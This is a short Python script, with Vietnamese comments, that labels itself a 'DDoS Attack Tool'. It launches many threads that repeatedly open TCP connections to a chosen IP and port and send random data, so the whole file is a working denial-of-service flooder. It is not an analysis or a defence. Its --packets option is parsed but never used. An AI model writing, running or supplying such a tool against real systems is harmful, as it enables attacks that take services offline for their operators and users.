import argparse  
import threading
import socket
import random
import time
import sys

parser = argparse.ArgumentParser(description='DDoS Attack Tool') 
parser.add_argument('--ip', required=True)
parser.add_argument('--port', type=int, required=True)
parser.add_argument('--packets', type=int, required=True)
parser.add_argument('--threads', type=int, required=True)

args = parser.parse_args()

stop_flag = False

#Hàm attack() thực hiện tấn công bằng cách gửi gói tin đến địa chỉ IP và cổng được cung cấp trên dòng lệnh. 
#Hàm này được thực thi trong mỗi luồng tấn công, tùy thuộc vào số lượng luồng được cung cấp trên dòng lệnh
def attack():
    global stop_flag
    try:
        while not stop_flag:
            packet = random._urandom(900)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #loại socket sử dụng địa chỉ IPv4, kiểu TCP
            s.settimeout(10) # Thiết lập thời gian chờ của socket là 10 giây
            s.connect((args.ip, args.port))
            s.send(packet)
            s.close()
    except socket.timeout:
        pass
#nếu socket bị timeout, attck() sẽ bỏ qua và chuyển sang lần tiếp theo

#Hàm main() thực hiện các bước chính để bắt đầu tấn công DDoS
def main():
    global stop_flag
    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=attack)
        t.daemon = True #gán thuộc tính daemon cho threads
        threads.append(t)
        t.start()

    print(f'Starting DDoS attack on {args.ip}:{args.port} with {args.threads} threads and {args.packets} packets per thread...')

#tạo vòng lặp vô hạn với thời gian nghỉ là 1s    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:  #khi bắt được tín hiệu KeyboardInterrupt thì đổi biến cờ hiệu và kết thúc
        stop_flag = True
        for t in threads:   
            t.join()

if __name__ == '__main__':
    main()
